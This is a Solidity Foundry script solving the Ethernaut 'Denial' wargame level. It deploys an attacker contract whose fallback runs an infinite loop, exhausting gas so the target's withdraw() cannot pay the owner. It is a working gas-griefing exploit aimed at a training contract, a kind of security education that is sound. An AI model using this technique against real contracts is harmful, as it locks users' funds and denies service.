// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Attacker {
    
    constructor(Denial denial) {
        denial.setWithdrawPartner(address(this));
    }

    // Fallback function that runs an infinite loop to consume all gas
    fallback() external payable { // payable because it must accept funds
        while (true) {

        }
    }

}

/// @author agadzhalov
/// @title Solution to Denial Ethernaut challenge
/// @notice Solution: We can provide a smart contract that consumes all the gas, making it impossible 
///         to continue sending funds to the owner. This can be done through an infinite loop.
contract DenialScript is Script {

    Denial private denial = Denial(payable(0xcE1Ab02DBc8bD372aA60015b6212cDf2e2fb9853));
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the Attacker contract with the Denial contract as parameter
        Attacker attacker = new Attacker(denial);
        
        // Call the withdraw function on the Denial contract
        denial.withdraw();

        vm.stopBroadcast();
    }
}
